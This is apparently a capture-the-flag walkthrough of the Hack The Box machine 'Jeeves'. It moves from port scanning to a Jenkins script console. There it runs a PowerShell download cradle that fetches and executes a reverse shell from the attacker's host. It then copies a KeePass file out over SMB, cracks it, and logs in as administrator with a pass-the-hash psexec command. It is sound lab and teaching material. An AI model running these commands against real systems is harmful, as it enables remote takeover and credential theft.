nmap scan

```
sudo nmap -p- --min-rate 10000 -oA nmap 10.10.10.63
PORT      STATE SERVICE
80/tcp    open  http
135/tcp   open  msrpc
445/tcp   open  microsoft-ds
50000/tcp open  ibm-db2
```

### Enumerating port 80

![image1](/assets/images/htb-jeeves/jeeves1.png)

Everytime I search something I get this error:

![image2](/assets/images/htb-jeeves/jeeves2.png)

But it's just an image, this website does nothing:

![image4](/assets/images/htb-jeeves/jeeves4.png)

Checking the source, you can see that everytime you submit it redirects you to `/error.html`

### Enumerating port 50000

We have this website:

![image4](/assets/images/htb-jeeves/jeeves4.png)

Running gobuster we find this:

```
sudo gobuster -w /opt/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://10.10.10.63:50000/ -t 40
/askjeeves (Status: 302)                                                       
```

Accessing it we have this jenkis page:

![image5](/assets/images/htb-jeeves/jeeves5.png)

Going to *Build Executor Status* then *Master* and there's a `Script Console`:

![image6](/assets/images/htb-jeeves/jeeves6.png)

I'm going to try to ping me back before try to get a reverse shell, for this I'll use:

```
println "ping -n 2 10.10.14.13".execute().text
```

Then set up tcpdump to see if it pings you back:

```
sudo tcpdump -i tun0 icmp
```

Click on the Run button and we have pings back:

```
listening on tun0, link-type RAW (Raw IP), capture size 262144 bytes
07:36:42.338287 IP 10.10.10.63 > ubuntu: ICMP echo request, id 1, seq 1, length 40
07:36:42.338303 IP ubuntu > 10.10.10.63: ICMP echo reply, id 1, seq 1, length 40
07:36:43.357758 IP 10.10.10.63 > ubuntu: ICMP echo request, id 1, seq 2, length 40
07:36:43.357773 IP ubuntu > 10.10.10.63: ICMP echo reply, id 1, seq 2, length 40
```

### Getting a reverse shell

Now I'll get a reverse shell I'll use the nishang `Invoke-PowerShellTcp.ps1`:

First I'll add this line at the end of the file:

```
Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.13 -Port 9001
```

Start a server:

```
sudo python3 -m http.server 80
```

And the listener:

```
nc -lvnp 9001
```

On the script console write this to download the file and it will execute:

```
get = """ powershell "IEX(New-Object Net.WebClient).downloadString('http://10.10.14.13/rev.ps1')" """
println get.execute().text
```

And we get the shell back

```
Connection received on 10.10.10.63 49679
Windows PowerShell running as user kohsuke on JEEVES
Copyright (C) 2015 Microsoft Corporation. All rights reserved.

PS C:\Users\Administrator\.jenkins>
```

### Enumerating the system to find a privesc vector

On `C:\Users\kohsuke\documents` we have this `CEH.kdbx` file:

```
PS C:\Users\kohsuke\documents> dir


    Directory: C:\Users\kohsuke\documents


Mode                LastWriteTime         Length Name                                                                  
----                -------------         ------ ----                                                                  
-a----        9/18/2017   1:43 PM           2846 CEH.kdbx
```

I'll transfer it to my machine:

Set up a SMB share:

```
sudo smbserver.py share .
```

And transfer it:

```
PS C:\Users\kohsuke\documents> net use z: \\10.10.14.13\share
The command completed successfully.

PS C:\Users\kohsuke\documents> copy CEH.kdbx z:
```

### Getting the password from the .kdbx file

It's a `.kdbx` file from keepass, I'll use `keepass2john.py` to get the hash:

```
python2 keepass2john.py CEH.kdbx 
CEH:$keepass$*2*6000*222*1af405cc00f979ddb9bb387c4594fcea2fd01a6a0757c000e1873f3c71941d3d*3869fe357ff2d7db1555cc668d1d606b1dfaf02b9dba2621cbe9ecb63c7a4091*393c97beafd8a820db9142a6a94f03f6*b73766b61e656351c3aca0282f1617511031f0156089b6c5647de4671972fcff*cb409dbc0fa660fcffa4f1cc89f728b68254db431a21ec33298b612fe647db48
```

I'll crack it with hashcat:

```
.\hashcat.exe -m 13400 .\hash.txt .\rockyou.txt
```

And the password is: `moonshine1`, next thing is open the key with keepass2 and use this password:

![image7](/assets/images/htb-jeeves/jeeves7.png)

### Getting information using the .kdbx file as a db on kepass2

We have this:

![image8](/assets/images/htb-jeeves/jeeves8.png)

And check the password of the DC Recovery PWN:

![image9](/assets/images/htb-jeeves/jeeves9.png)

Backup stuff has this hash:

![image10](/assets/images/htb-jeeves/jeeves10.png)

Now I can use `psexec` to login with the hash as administrator:

```
sudo psexec.py administrator@10.10.10.63 -hashes aad3b435b51404eeaad3b435b51404ee:e0fb1fb85756c24235ff238cbe81fe00
```

### Getting the flag

The flag isn't here:

```
c:\Users\Administrator\Desktoptype hm.txt
The flag is elsewhere.  Look deeper.
```

With `dir /r` we can see this:

```
c:\Users\Administrator\Desktop>dir /r
 Volume in drive C has no label.
 Volume Serial Number is BE50-B1C9

 Directory of c:\Users\Administrator\Desktop

11/08/2017  09:05 AM    <DIR>          .
11/08/2017  09:05 AM    <DIR>          ..
12/24/2017  02:51 AM                36 hm.txt
                                    34 hm.txt:root.txt:$DATA
11/08/2017  09:05 AM               797 Windows 10 Update Assistant.lnk
               2 File(s)            833 bytes
               2 Dir(s)   7,498,948,608 bytes free
```

We have this `hm.txt:root.txt:$DATA` file, we can see the content with this command:

```
powershell (Get-Content hm.txt -Stream root.txt)
```
